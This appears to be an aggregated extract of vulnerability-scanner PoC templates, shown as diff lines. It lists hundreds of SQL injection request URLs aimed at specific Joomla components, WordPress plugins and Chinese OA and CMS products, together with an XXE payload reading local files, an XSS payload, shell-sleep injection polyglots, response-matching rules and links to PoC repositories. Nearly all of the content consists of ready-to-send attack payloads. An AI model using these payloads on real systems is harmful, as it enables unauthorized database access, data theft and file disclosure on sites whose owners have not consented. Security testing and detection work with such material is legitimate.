+- '{{BaseURL}}/img/img.php?class1=1&serch_sql=%201%3D1%23'
+- '{{BaseURL}}/img/img.php?class1=1&serch_sql=%201%3D2%23'
+- '{{BaseURL}}/index.php?c=api&m=data2&auth=582f27d140497a9d8f048ca085b111df&param=action=sql%20sql=%27select%20md5({{num}})%27'
+- '{{BaseURL}}/index.php?key=%27%20or%20extractvalue%281%2Cconcat%280x7e%2C%28md5%28123%29%29%29%29%20or%27'
+- '{{BaseURL}}/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=test") and extractvalue(1,concat(0x7e,md5(1234567890))) -- a'
+- '{{BaseURL}}/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=test") and extractvalue(1,concat(0x7e,md5({{num}}))) -- a'
+- '{{BaseURL}}/index.php?option=com_blog_calendar&modid=-1%20OR%201%20GROUP%20BY%20CONCAT(0x7e7e7e,md5(123),0x7e7e7e,FLOOR(RAND(0)*2))%20HAVING%20MIN(0)#'
+- '{{BaseURL}}/index.php?option=com_ebcontent&view=article&id=37%27%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))mbyz)%20AND%20%27dIwT%27=%27dIwT&cid=29&Itemid=129&lang=vn'
+- '{{BaseURL}}/index.php?option=com_fastball&view=player&id=266&season=1%20AND%20(SELECT%204132%20FROM(SELECT%20COUNT(*),CONCAT((SELECT%20MID((IFNULL(CAST(md5(233)%20AS%20CHAR),0x20)),1,54)),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)&Itemid=28'
+- '{{BaseURL}}/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x3a,concat(1,(select
+- '{{BaseURL}}/index.php?option=com_fss&view=test&prodid=777777.7%27+union+all+select+77777777777777%2C77777777777777%2C77777777777777%2Cmd5(3.1415)%2C77777777777777%2C77777777777777%2C77777777777777%2C77777777777777%2C77777777777777%2C77777777777777%2C77777777777777--+D4NB4R%22'
+- '{{BaseURL}}/index.php?option=com_gallery_wd&view=gallerybox&image_id=19&gallery_id=2'
+- '{{BaseURL}}/index.php?option=com_googlesearch_cse&n=30&Itemid=&cx=017093687396734519753%3Ao_92rwvgxxw&cof=FORID%3A9&ie=ISO-8859-1&q=%22%3E%3Cimg+src%3Dx+onerror%3Dalert(''0x2334171512353333>'')%3E&sa=Search&hl=en'
+- '{{BaseURL}}/index.php?option=com_job&controller=listcategory&task=viewJob&id_job=-1+UNION+ALL+SELECT+1,md5(3.1415),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42--'
+- '{{BaseURL}}/index.php?option=com_jobgroklist&view=posting&id=2:mechanic&Itemid=-7282%20OR%201%20GROUP%20BY%20CONCAT%280x7e7e7e%2Cmd5%28123%29%2C0x7e7e7e%2CFLOOR%28RAND%280%29%2a2%29%29%20HAVING%20MIN%280%29%23'
+- '{{BaseURL}}/index.php?option=com_jobprofile&Itemid=61&task=profilesview&id=-1+union+all+select+1,concat_ws(0x3a,0x3a,md5(3.1415),0x3a),3,4,5,6,7,8,9'
+- '{{BaseURL}}/index.php?option=com_pccookbook&page=viewuserrecipes&user_id=-9999999+UNION+SELECT+md5(3.1415)--'
+- '{{BaseURL}}/index.php?option=com_people&controller=people&task=details&id=-1
+- '{{BaseURL}}/index.php?option=com_rand&catID=1%27%20and(select%201%20FROM(select
+- '{{BaseURL}}/index.php?option=com_rbids&task=categories&filter_letter=%27%20AND%20EXTRACTVALUE%2822%2CCONCAT%280x5c%2Cmd5%281%29%29%29--%20X%0A'
+- '{{BaseURL}}/index.php?option=com_rpl&view=propertyshow&pid=3%27%20AND%20%28SELECT%204394%0AFROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%280x7e7e7e%2C%28SELECT%0A%28md5%28123%29%29%29%2C0x7e7e7e%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%0AINFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20&Itemid'
+- '{{BaseURL}}/index.php?option=com_s5clanroster&view=s5clanroster&layout=category&task=category&id=-null%27+/*!50000UnIoN*/+/*!50000SeLeCt*/md5(3.1415),222--+-'
+- '{{BaseURL}}/index.php?option=com_sponsorwall&task=click&wallid=1%20AND%20(SELECT%204132%20FROM(SELECT%20COUNT(*),CONCAT((SELECT%20MID((IFNULL(CAST(md5(233)%20AS%20CHAR),0x20)),1,54)),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)'
+- '{{BaseURL}}/index.php?option=com_training&task=show&id=1084%20AND%20SLEEP%285%29'
+- '{{BaseURL}}/index.php?option=com_training&task=show&id=1084'
+- '{{BaseURL}}/index.php?option=com_vikbooking&view=availability&room_ids[0]=1%20AND%20(SELECT%204132%20FROM(SELECT%20COUNT(*),CONCAT((SELECT%20MID((IFNULL(CAST(md5(233)%20AS%20CHAR),0x20)),1,54)),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)'
+- '{{BaseURL}}/index.php?s=api/goods_detail&goods_id=1 and updatexml(1,concat(0x7e,md5(233),0x7e),1)'
+- '{{BaseURL}}/index.php?s=apigoods/get_goods_detail&id=1%20and%20updatexml(1,concat(0x7e,md5({{number}}),0x7e),1)'
+- '{{BaseURL}}/jcms/m_5_d/opr_wap_col.jsp?fn_billstatus=D&strid=1%29%20AND%209054%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28110%29%7C%7CCHR%2887%29%7C%7CCHR%2878%29%7C%7CCHR%2875%29%2C5%29%20AND%20%289211%3D9211'
+- '{{BaseURL}}/jcms/m_5_e/init/download/downfile.jsp?filename=1%27%20AND%203904%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2880%29%7C%7CCHR%2898%29%7C%7CCHR%2865%29%7C%7CCHR%2881%29%2C5%29%20AND%20%27tMgk%27%3D%27tMgk'
+- '{{BaseURL}}/jcms/m_5_e/init/download/downfile.jsp?filename=1'
+- '{{BaseURL}}/jcms/short_message/opr_domsg.jsp?fn=DA&i_id=1%29%20AND%205639%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2880%29%7C%7CCHR%2888%29%7C%7CCHR%2869%29%7C%7CCHR%28106%29%2C5%29%20AND%20%289259%3D9259'
+- '{{BaseURL}}/jcms/short_message/opr_domsg.jsp?fn=DA&i_id=1'
+- '{{BaseURL}}/jcms/short_message/que_recemsg.jsp?que_keywords=1&loginid=a%27%20AND%201111%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28111%29%7C%7CCHR%2885%29%7C%7CCHR%2899%29%7C%7CCHR%28109%29%2C5%29%20AND%20%27a%27%3D%27a'
+- '{{BaseURL}}/jcms/short_message/que_recemsg.jsp?que_keywords=1&loginid=a'
+- '{{BaseURL}}/jcms/workflow/objectbox/selectx_list.jsp?id=1%27%20union%20select%20NULL%2CCHR%28126%29%7C%7CCHR%28126%29%7C%7CCHR%28126%29%7C%7CNVL%28CAST%28USER%20AS%20VARCHAR%284000%29%29%2CCHR%2832%29%29%7C%7CCHR%28126%29%7C%7CCHR%28126%29%7C%7CCHR%28126%29%20from%20dual--%20-'
+- '{{BaseURL}}/jcms/workflow/sys/que_dictionary.jsp?que_keywords1=-1%27%20OR%201%3D1%20AND%20%27a%27%3D%27a'
+- '{{BaseURL}}/jcms/workflow/sys/que_dictionary.jsp?que_keywords1=-1%27%20OR%201%3D1%20AND%20%27a%27%3D%27b'
+- '{{BaseURL}}/job/job.php?lang=cn&id=1&settings[met_column]=met_admin_table%20where%201%20AND%20SLEEP(5)--'
+- '{{BaseURL}}/lm/front/api/opr_datacall.jsp?fn_billstatus=E&vc_id=1%27%20AND%204683=DBMS_PIPE.RECEIVE_MESSAGE(CHR(120)||CHR(104)||CHR(119)||CHR(98),5)%20AND%20%27OxYZ%27=%27OxYZ'
+- '{{BaseURL}}/lm/front/api/opr_datacall.jsp?fn_billstatus=E&vc_id=1'
+- '{{BaseURL}}/login.php?key=1%27or%20updatexml(1,(select%20md5(123)),1)%23'
+- '{{BaseURL}}/login/forgetpswd.php?ClearS=1&loginname=1%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--'
+- '{{BaseURL}}/lostpass.php?key=1%27or%20updatexml(1,(select%20md5(123)),1)%23'
+- '{{BaseURL}}/lostpass.php?md5=aa&userid=aa%27%20AND%20%28SELECT%206071%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%280x7e7e7e%2Cmd5%28123%29%2C0x7e7e7e%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20and%27'
+- '{{BaseURL}}/lostpass.php?userid=aa&md5=aa%27%20AND%20%28SELECT%206071%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%280x7e7e7e%2Cmd5%28123%29%2C0x7e7e7e%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20and%27'
+- '{{BaseURL}}/mas/schedule.jsp?type=group&SGPID=1%27+UNION+ALL+SELECT+1,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--'
+- '{{BaseURL}}/member/login.php/aa''UNION SELECT (select concat(admin_id,0x23,md5(5))
+- '{{BaseURL}}/member/login.php/aa''UNION%20SELECT%20concat(0x7e7e7e,md5(123),0x7e7e7e),2,3,4,5,6,1111,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29%23/aa'
+- '{{BaseURL}}/metinfo/admin/admin/getpassword.php?lang=cn&p=MSdvcihzZWxlY3Qgc2xlZXAoNikpIy4x'
+- '{{BaseURL}}/metinfo/member/getpassword.php?lang=cn&p=MSdvcihzZWxlY3Qgc2xlZXAoNikpIy4x'
+- '{{BaseURL}}/misc.php?mod=stat&op=trend&xml=1&merge=1&types[1]=password`as%20statistic%20(select%20(select%20md5(12345)%20from%20pre_common_statuser,pre_ucenter_members%20as'
+- '{{BaseURL}}/mobile/browser/WorkflowCenterTreeData.jsp'
+- '{{BaseURL}}/module/sitesearch/index.jsp?columnid=0%29%20AND%204351%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28106%29%7C%7CCHR%2873%29%7C%7CCHR%2898%29%7C%7CCHR%2870%29%2C7%29%20AND%20%281%3D1'
+- '{{BaseURL}}/news/'
+- '{{BaseURL}}/news{{news}}&serch_sql=as%20a%20join%20information_schema.CHARACTER_SETS%20as%20b%20where%20if(ascii(substr(b.CHARACTER_SET_NAME,1,1))>0,1,0)%20limit%201--%20sd&imgproduct=xxxx'
+- '{{BaseURL}}/news{{news}}&serch_sql=as%20a%20join%20information_schema.CHARACTER_SETS%20as%20b%20where%20if(ascii(substr(b.CHARACTER_SET_NAME,1,1))>255,1,0)%20limit%201--%20sd&imgproduct=xxxx'
+- '{{BaseURL}}/page/maint/login/Page.jsp?templateId=18%20and%201=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(199)||CHR(81)||CHR(109),5)'''
+- '{{BaseURL}}/page/maint/login/Page.jsp?templateId=18%20waitfor%20delay%20''0:0:5'''
+- '{{BaseURL}}/page/maint/login/Page.jsp?templateId=18'
+- '{{BaseURL}}/pay/api/change_status.php?id=1%27%20or%20updatexml%281%2Cconcat%280x7e%2C%28SELECT%20md5%28123%29%20limit%200%2C1%29%29%2C0%29%20or%27'
+- '{{BaseURL}}/plugin.php?id=nds_up_ques:nds_ques_viewanswer&srchtxt=1&orderby=dateline%20and%201=(updatexml(1,concat(0x27,MD5(1)),1))--'
+- '{{BaseURL}}/plugin.php?id=v63shop:goods&pac=info&gid=1 and 1=2 union /*!50000select*/
+- '{{BaseURL}}/plugin.php?id=v63shop:goods&pac=info&gid=`''` or @`''''` union select
+- '{{BaseURL}}/public/index.php/home/index/bind_follow/?publicid=1&is_ajax=1&uid[0]=exp&uid[1]=)%20and%20updatexml(1,concat(0x7e,{{randstr}},0x7e),1)--+'
+- '{{BaseURL}}/pweb/careerapply/HrmCareerApplyPerEdit.jsp?id=1%20union%20select%201%2C2%2C3%2Csys.fn_varbintohexstr%28hashbytes%28%27MD5%27%2C%27123%27%29%29%2C5%2C6%2C7'
+- '{{BaseURL}}/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201%2C2%2C3%2Csys.fn_varbintohexstr%28hashbytes%28%27MD5%27%2C%27123%27%29%29%2C5%2C6%2C7'
+- '{{BaseURL}}/pweb/careerapply/HrmCareerApplyWorkEdit.jsp?id=1%20union%20select%201%2C2%2C3%2Csys.fn_varbintohexstr%28hashbytes%28%27MD5%27%2C%27123%27%29%29%2C5%2C6%2C7'
+- '{{BaseURL}}/pweb/careerapply/HrmCareerApplyWorkView.jsp?id=1%20union%20select%201%2C2%2C3%2Csys.fn_varbintohexstr%28hashbytes%28%27MD5%27%2C%27123%27%29%29%2C5%2C6%2C7'
+- '{{BaseURL}}/register.php?key=1%27or%20updatexml(1,(select%20md5(123)),1)%23'
+- '{{BaseURL}}/search.php?key=%27%20or%20extractvalue%281%2Cconcat%280x7e%2C%28md5%28123%29%29%29%29%20or%27'
+- '{{BaseURL}}/search/search.php?&searchtype=1&searchword=a283e9d11ea180bc7a360e9f1a833e51&module=5&lang=cn&order_sql=%20||%201=1%20'
+- '{{BaseURL}}/search/search.php?&searchtype=1&searchword=a283e9d11ea180bc7a360e9f1a833e51&module=5&lang=cn&order_sql=%20||%201=2%20'
+- '{{BaseURL}}/search/search.php?&searchtype=1&searchword=a283e9d11ea180bc7a360e9f1a833e51&module=5&lang=cn&order_sql='
+- '{{BaseURL}}/search/search.php?class1=2&class2=&class3=&searchtype=2&searchword=testvul&lang=cn&class1re=)%20and%201=1--%20sd'
+- '{{BaseURL}}/search/search.php?class1=2&class2=&class3=&searchtype=2&searchword=testvul&lang=cn&class1re=)%20and%201=2--%20sd'
+- '{{BaseURL}}/shop.php?ac=view&shopid=1 and(select 1 from(select count(*),concat((select
+- '{{BaseURL}}/showphoto.xf?photoid=1%20AND%2076%3D69'
+- '{{BaseURL}}/showphoto.xf?photoid=1%20AND%2076%3D76'
+- '{{BaseURL}}/showphoto.xf?photoid=1'
+- '{{BaseURL}}/sqlite/'
+- '{{BaseURL}}/sqlitemanager/'
+- '{{BaseURL}}/sub_site.php?key=1%27or%20updatexml(1,(select%20md5(123)),1)%23'
+- '{{BaseURL}}/sys/left.jsp?lx=1%27%20UNION%20ALL%20SELECT%20null%2Csys.fn_varbintohexstr%28hashbytes%28%27MD5%27%2C%27123%27%29%29%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--%20-'
+- '{{BaseURL}}/upload/plugin.php?id=nds_up_ques:nds_ques_viewanswer&srchtxt=1&orderby=dateline%20and%201=(updatexml(1,concat(0x27,md5(1)),1))--'
+- '{{BaseURL}}/user.php?act=collection_list'
+- '{{BaseURL}}/vc/vc/interface/index/que_style_coltop.jsp?webid={{rand_int(1,10)}}%20and%201=1'
+- '{{BaseURL}}/vc/vc/interface/index/que_style_coltop.jsp?webid={{rand_int(1,10)}}%20and%201=2'
+- '{{BaseURL}}/vc/vc/interface/styletop/arttop_interface.jsp?i_id={{rand_int(1,
+- '{{BaseURL}}/vc/vc/interface/styletop/coltop_interface.jsp?i_id={{rand_int(1,10)}}%20and%201=1'
+- '{{BaseURL}}/vc/vc/interface/styletop/coltop_interface.jsp?i_id={{rand_int(1,10)}}%20and%201=2'
+- '{{BaseURL}}/vc/vc/style/opr_copycode.jsp?id=-1%20or%201%3D1'
+- '{{BaseURL}}/vc/vc/style/opr_copycode.jsp?id=-1%20or%201%3D2'
+- '{{BaseURL}}/wap.php?key=%27%20AND%20%28SELECT%206071%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%280x7e7e7e%2Cmd5%28123%29%2C0x7e7e7e%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20and%27'
+- '{{BaseURL}}/weaver/weaver.file.SignatureDownLoad?markId=1%20union%20select%20%27..%2fecology%2fWEB-INF%2fprop%2fweaver.properties%27'
+- '{{BaseURL}}/weblinks-categories?id=0%20%29%20union%20select%20md5(3.1415)--%20%29'
+- '{{BaseURL}}/wp-admin/admin-ajax.php'
+- '{{BaseURL}}/wp-admin/admin-ajax.php?action=submit_nex_form&nex_forms_Id=1%20and%20sleep(5)'
+- '{{BaseURL}}/wp-admin/admin-ajax.php?action=submit_nex_form&nex_forms_Id=1'
+- '{{BaseURL}}/wp-content/plugins/AzonPop/files/view/showpopup.php?popid=null%20%20/*!00000union*/%20select%201,2,md5(1),4,5'
+- '{{BaseURL}}/wp-content/plugins/community-events/tracker.php'
+- '{{BaseURL}}/wp-content/plugins/ip-logger/map-details.php?lat=-1%20UNION%20ALL%20SELECT%20MD5(3.14),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20&lon=-1&blocked=-1%20'
+- '{{BaseURL}}/wp-content/plugins/kboard/board.php?pageid=1&board_id=1&mod=document&uid=1%20OR%20(SELECT%202*(IF((SELECT%20*%20FROM%20(SELECT%20CONCAT((SELECT%20MID((IFNULL(CAST(md5(1)%20AS%20CHAR),0x20)),1,451)),0x78))s),%208446744073709551610,%208446744073709551610)))'
+- '{{BaseURL}}/wp-content/plugins/leaguemanager/readme.txt'
+- '{{BaseURL}}/wp-content/plugins/media-library-categories/sort.php?termid=-1%20UNION%20ALL%20SELECT%20md5(233),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20'
+- '{{BaseURL}}/wp-content/plugins/wp-advanced-search/readme.txt'
+- '{{BaseURL}}/wp-content/plugins/wp-fastest-cache/readme.txt'
+- '{{BaseURL}}/wp-content/plugins/wp-statistics/readme.txt'
+- '{{BaseURL}}/wp-content/plugins/zero-spam/readme.txt'
+- '{{BaseURL}}/wppg_photogallery/wppg_photo_details/?gallery_id=1%20UNION%20ALL%20SELECT%20CONCAT(0x7176787071,0x76576b586376794b756d,0x71707a7171)--&image_id=1'
+- '{{BaseURL}}/wui/theme/ecology7/page/login.jsp?templateId=1'
+- '{{BaseURL}}/wui/theme/ecology7/page/login.jsp?templateId=1''%20AND%206120=DBMS_PIPE.RECEIVE_MESSAGE(CHR(68)||CHR(102)||CHR(119)||CHR(86),5)%20AND%20''bcBY''=''bcBY'
+- '{{BaseURL}}/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5({{num}}))'
+- '{{BaseURL}}/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5({{randstr}}))'
+- '{{BaseURL}}/zentao/user-login.html'
+- '{{md5("{{randstr}}")}}'
+- '{{md5(num)}}'
+- '{{md5(string)}}'
+- '{{md5({{num}})}}'
+- '{{randomValue}}'
+- '{{randstr}}'
+- '{{verify}}'
+- '在将 nvarchar 值 &#39;(.*)&#39; 转换成数据类型 int 时失败。'
+- (/news.php\?[a-zA-Z0-9&=]*class[\d]+=[\d]+)[\"]
+- (select*from(select(sleep(7)))a)
+- ;waitfor delay '0:0:7'--
+- <h2><a href=[\'"]?[./a-zA-Z0-9_-]*shownews.php\?"
+- <option selected='selected'
+- Query("[[.original]]{{.payload}}")
+- Query("[[.original]]{{.payload}}", "{{.name}}")
+- WebOffice.RecordID="0xfd690c56512ce3624ed5cd4799e25d01"
+- case=archive&act=orders&oid=(.*?)"
+- class="entry-title"
+- compare_versions(version, '< 0.8.7.5')
+- compare_versions(version, '< 2.2.0')
+- compare_versions(version, '< 3.3.6')
+- compare_versions(version, '<= 3.9.11')
+- contains(body, "adivaha")
+- contains(body, "c8c605999f3d8352d7bb792cf3fdb25")
+- contains(body, "{{str1}}1{{str2}}")
+- contains(body, 'SmartSoft.Web.AjaxMethods.GetCompanyItem')
+- contains(body, 'error\":\"system error') && !contains(body, 'securityIntercept')
+- contains(body, 'value=\"deneme')
+- contains(body, '错误，请联系管理员')
+- contains(body,"1202cb962ac59075b964b07152d234b70")
+- contains(body,"202cb962ac59075b964b07152d234b7")
+- contains(body,"202cb962ac59075b964b07152d234b70")
+- contains(body,"313233343536373839")
+- contains(body,"3438d5e3ead84b2effc5ec33ed1239f5")
+- contains(body,"4beed3b9c4a886067de0e3a094246f7")
+- contains(body,"63e1f04640e83605c1d177544a5a0488")
+- contains(body,":::o:::")
+- contains(body,"Updated row")
+- contains(body,"c4ca4238a0b923820dcc509a6f75849")
+- contains(body,"c4ca4238a0b923820dcc509a6f75849b")
+- contains(body,"c4ca4238a0b923820dcc509a6f75849b1")
+- contains(body,"cf67355a3333e6e143439161adc2d82e")
+- contains(body,"e165421110ba03099a1c0393373c5b4")
+- contains(body,"e165421110ba03099a1c0393373c5b43")
+- contains(body,"qvxpqvWkXcvyKumqpzqq")
+- contains(body,'0x2334171512353333')
+- contains(body,'202cb962ac59075b964b07152d234b7')
+- contains(body,'202cb962ac59075b964b07152d234b70')
+- contains(body,'4beed3b9c4a886067de0e3a094246f78')
+- contains(body,'63e1f04640e83605c1d177544a5a0488')
+- contains(body,'827ccb0eea8a706c4c34a16891f84e7b1')
+- contains(body,'DriverClasses')
+- contains(body,'SYSTEM')
+- contains(body,'c4ca4238a0b923820dcc509a6f75849')
+- contains(body,'c4ca4238a0b923820dcc509a6f75849b')
+- contains(body,'e165421110ba03099a1c0393373c5b431')
+- contains(body,'ed3b9c4a886067de0e3a094246')
+- contains(body,'public $password')
+- contains(body,'qkxpq1qkjqq1')
+- contains(body,'~~~202cb962ac59075b964b07152d234b70~~~')
+- contains(body_1,"4beed3b9c4a886067de0e3a094246f7")||contains(body_2,"4beed3b9c4a886067de0e3a094246f7")
+- contains(body_1,"Products")
+- contains(body_1,"Time")
+- contains(body_1,'a283e9d11ea180bc7a360e9f1a833e51') && contains(body_2,'a283e9d11ea180bc7a360e9f1a833e51')
+- contains(body_1,'g\"></h')
+- contains(body_1,'ns1:out>4</ns1:out>')
+- contains(body_1,'在线支付')
+- contains(body_2, "c8c605999f3d8352d7bb792cf3fdb25")
+- contains(body_2, 'qaxnb')
+- contains(body_2,"No Product Available")
+- contains(body_2,"Warning")
+- contains(body_2,"e165421110ba03099a1c0393373c5b4")
+- contains(body_2,"e165421110ba03099a1c0393373c5b43")
+- contains(body_2,'ns1:out>4</ns1:out>')
+- contains(body_2,'提交订单成功')
+- contains(body_3,'<deptName>')
+- contains(body_3,'e10adc3949ba59abbe56e057f20f883e')
+- contains(body_3,'ns1:out>5</ns1:out>')
+- contains(content_type, "text/html") && contains(body, "videoseyret")
+- contains(header, "text/html")
+- contains(raw_1,"wap-jobs-show.php?id=1")
+- contains(raw_2,"wap-jobs-show.php?id=1")
+- https://codecanyon.net/item/groomify-barbershop-salon-spa-booking-and-ecommerce-platform/45808114#
+- https://github.com/GREENHAT7/pxplan/blob/e2fc04893ca95e177021ddf61cc2134ecc120a8e/goby_pocs/CmsEasy_crossall_act.php_SQL_injection_vulnerability.json#L28
+- https://github.com/GREENHAT7/pxplan/blob/e2fc04893ca95e177021ddf61cc2134ecc120a8e/xray_pocs/yaml-poc-eqccd-eqccd_oa-sql_injection-CT-456760.yml#L8
+- https://github.com/Wrin9/weaverOA_sql_RCE/blob/14cca7a6da7a4a81e7c7a7016cb0da75b8b290bc/weaverOA_sql_injection_POC_EXP.py#L46
+- https://github.com/ibaiw/2023Hvv/blob/556de69ffc370fd9827e2cf5027373543e2513d4/%E6%B3%9B%E5%BE%AE%20HrmCareerApplyPerView%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md?plain=1#L3
+- https://github.com/wy876/POC/blob/9ffe279891f6c9b48ed680188ef10fc06a787f67/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BAclientServer%E6%8E%A5%E5%8F%A3SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md?plain=1#L6
+- https://mp.weixin.qq.com/s?__biz=MzAxODg1MDMwOQ==&mid=2247489109&idx=1&sn=0c9a3388e4ac1389897b4449fb3afNULL0&chksm=9bcea13facb928293ac06fede04f15d564b60a5e8ad26208f28ebe175017aa3d2144617f2b60&mpshare=1&scene=23&srcid=0418r0yqNrZ1hyGCdDHl8EK1#rd
+- https://www.openservis.cz/prestashop-blog/nejcastejsi-utoky-v-roce-2023-seznam-deravych-modulu-nemate-nejaky-z-nich-na-e-shopu-i-vy/#pll_switcher
+- https://www.openservis.cz/prestashop-blog/nejcastejsi-utoky-v-roce-2023-seznam-deravych-modulu-nemate-nejaky-z-nich-na-e-shopu-i-vy/https://www.openservis.cz/prestashop-blog/nejcastejsi-utoky-v-roce-2023-seznam-deravych-modulu-nemate-nejaky-z-nich-na-e-shopu-i-vy/#pll_switcher
+- https://y4er.com/post/metinfo7-sql-tips/#sql-injection-1
+- https://y4er.com/post/metinfo7-sql-tips/#sql-injection-2
+- result":42601
+- root: "{{.BaseURL}}/index.php"
+- sleep: '8'
+- status_code==200 && contains(body,"202cb962ac59075b964b07152d234b7")
+- status_code==200 && contains(body,"4beed3b9c4a886067de0e3a094246f7")
+- status_code==200 && contains(body,"c4ca4238a0b923820dcc509a6f75849b")
+- status_code==200 && contains(body,"cb962ac59075b964b07152d234b70")
+- status_code==200 && contains(body,"e4da3b7fbbce2345d7772b0674a318d5")
+- status_code==200 && contains(body,"qzqjqNYcLuHdPHkqkjvq")
+- status_code==200 && contains(body,"~202cb962ac59075b964b07152d234b7")
+- status_code==200 && contains(body,"~~~")
+- status_code==200 && contains_all(body,"XPATH syntax")
+- status_code==200 && contains_all(body,"{{md5({{payload}})}}")
+- status_code==200 && duration>=7 && !contains(body,"%2Fmodule%2Fsitesearch%2Findex.jsp%3Fcolumnid%3D")
+- status_code_1==200 && !contains(body_1,"out of range")
+- status_code_1==200 && contains(body_1,"4beed3b9c4a886067de0e3a094246f7")
+- status_code_1==200 && status_code_2==200 && contains(body_1,"tb_label_title_text")
+- status_code_1==302 && status_code_2==302 && (contains(all_headers_1,'SQLException')
+- status_code_2==200 && contains(body_2,"4beed3b9c4a886067de0e3a094246f7")
+- status_code_2==200 && contains(body_2,"out of range")
+- status_code_3==200 && contains(body_3,"4beed3b9c4a886067de0e3a094246f7")
+-----------------------------47891759416863
+-----------------------------47891759416863--
+------------GFioQpMK0vv2
+------------GFioQpMK0vv2--
+------WebKitFormBoundary7oFL75gOdBB1Y9pr
+------WebKitFormBoundary7oFL75gOdBB1Y9pr--
+------WebKitFormBoundaryXLYuClHc0fZFSeK8
+------WebKitFormBoundaryXLYuClHc0fZFSeK8--
+--f289a6438bcc45179bcd3eb7ddc555d0
+--f289a6438bcc45179bcd3eb7ddc555d0--
+-1' OR 1=1 OR 'ns'='ns
+-@`'`  AND (SELECT 3397 FROM (SELECT(SLEEP(5)))jCdN)
+/*
+/*$(sleep 5)`sleep 5``*/-sleep(5)#'/*$(sleep 5)`sleep 5` #*/||sleep(5)||'\"||sleep(5)||\"`
+/*$(sleep 5)`sleep 5``*/sleep(5)#'/*$(sleep 5)`sleep 5` #*/||sleep(5)||'\"||sleep(5)||\"`
+/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+0x61646d696e
+1 from (select count(*),concat((select md5(3.14)),floor(rand(0)*2))a from information_schema.tables
+1" AND 1=1
+1" AND 1=2
+1' AND 1=1
+1' AND 1=2
+1,2,3,4,5,6,md5(3.14),8,9,10,11,12,13,14'
+10)}}%20and%201=1'
+10)}}%20and%201=2'
+1=1'
+1、过滤\".\"，使用户在url中不能回溯上级目录。
+2018-03-19及之前版本中的ctl/main/Json.php、ctl/main/service/Data.php和comp/Db/Mysql.php文件存在SQL注入漏洞。远程攻击者可通过向json/newslist发送‘limit’参数利用该漏洞执行SQL命令。 "
+<!--type: int-->
+<!--type: string-->
+<?xml version="1.0" encoding="utf-8"?>
+<?xml version="1.0" encoding="utf-8"?><!DOCTYPE copyright [<!ENTITY test SYSTEM "file:///">]><xml><ToUserName>&test;</ToUserName><FromUserName>1111</FromUserName><MsgType>123</MsgType><FuncFlag>3</FuncFlag><Content>1%' union select md5({{num}})#</Content></xml>
+<GetEmpSearch xmlns="http://tempuri.org/ioffice/udfmr">
+<GetLoginedEmpNoReadedInf xmlns="http://tempuri.org/">
+<GetOAById xmlns="http://tempuri.org/">
+<GetUsersInfo xmlns="http://tempuri.org/">
+<SignOut xmlns="http://tempuri.org/">
+<arg0>-5398) UNION ALL SELECT 5336,5336,5336,5336,md5(999999999)-- -</arg0>
+<sId>string' AND 8448 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(113)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (8448=8448) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(107)+CHAR(113)+CHAR(113))) AND 'OFyo'='OFyo</sId>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
